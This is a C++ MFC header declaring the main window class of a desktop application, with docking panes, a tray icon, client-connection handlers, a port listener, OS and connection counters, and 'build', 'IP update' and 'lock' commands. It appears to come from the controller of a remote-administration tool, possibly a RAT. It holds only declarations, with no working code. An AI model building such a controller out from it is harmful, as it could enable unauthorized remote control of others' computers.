// MainFrm.h : interface of the CMainFrame class
//
/////////////////////////////////////////////////////////////////////////////

#if !defined(AFX_MAINFRM_H__3F531B4D_21DF_49EA_B4AF_63AA5555104F__INCLUDED_)
#define AFX_MAINFRM_H__3F531B4D_21DF_49EA_B4AF_63AA5555104F__INCLUDED_

//#include "TrayIcon.h"	// Added by ClassView
#if _MSC_VER > 1000
#pragma once
#endif // _MSC_VER > 1000

#define CMainFrameBase CXTPFrameWnd, CXTPOffice2007FrameHook

class CMainFrame : public CMainFrameBase
{	
protected: // create from serialization only
	CMainFrame();
	DECLARE_DYNCREATE(CMainFrame)

// Attributes
public:
	CMap<UINT,UINT, CWnd* , CWnd*> m_mapPanes;
	int m_nCount;
// Operations
public:
   
// Overrides
	// ClassWizard generated virtual function overrides
	//{{AFX_VIRTUAL(CMainFrame)
	public:
	virtual BOOL PreCreateWindow(CREATESTRUCT& cs);
	//}}AFX_VIRTUAL

// Implementation
public:
	int nOSCount [10];
	void ShowOSCount();
	void ShowToolTips(LPCTSTR lpszText);
	void ShowConnectionsNumber();
	static void ProcessReceiveComplete(ClientContext *pContext);
	static void ProcessReceive(ClientContext *pContext);
	void Activate(UINT nPort, UINT nMaxConnections);
	static void CALLBACK NotifyProc(LPVOID lpParam, ClientContext* pContext, UINT nCode);
	void SetTheme(int iTheme);
	virtual ~CMainFrame();
#ifdef _DEBUG
	virtual void AssertValid() const;
	virtual void Dump(CDumpContext& dc) const;
#endif //_DEBUG

protected:  // control bar embedded members
	CXTPStatusBar	m_wndStatusBar;
	int         m_iTheme;
	CXTPTrayIcon m_TrayIcon;
	CXTPDockingPane*        m_pActivePane;
	CXTPDockingPaneManager  m_paneManager;
	CXTPDockingPane* CreatePane(int x, int y, CRuntimeClass* pNewViewClass, CString strFormat, XTPDockingPaneDirection direction, CXTPDockingPane* pNeighbour = NULL);
// Generated message map functions
protected:
	//{{AFX_MSG(CMainFrame)
	afx_msg int OnCreate(LPCREATESTRUCT lpCreateStruct);
	afx_msg void OnClose();
	afx_msg void OnSysCommand(UINT nID, LPARAM lParam);
	afx_msg void OnUpdateStatusBar(CCmdUI *pCmdUI);
	afx_msg void OnShow();
	afx_msg void OnHide();
	afx_msg void OnExit();
	afx_msg BOOL OnEraseBkgnd(CDC* pDC);
	afx_msg void OnAppExit();
	afx_msg void OnSetting();
	afx_msg void OnBuild();
	afx_msg void OnIpupdate();
	afx_msg void Onsuoding();
	//}}AFX_MSG
	afx_msg LRESULT OnDockingPaneNotify(WPARAM wParam, LPARAM lParam);
	afx_msg void OnCustomize();
	DECLARE_MESSAGE_MAP()
};

/////////////////////////////////////////////////////////////////////////////

//{{AFX_INSERT_LOCATION}}
// Microsoft Visual C++ will insert additional declarations immediately before the previous line.

#endif // !defined(AFX_MAINFRM_H__3F531B4D_21DF_49EA_B4AF_63AA5555104F__INCLUDED_)
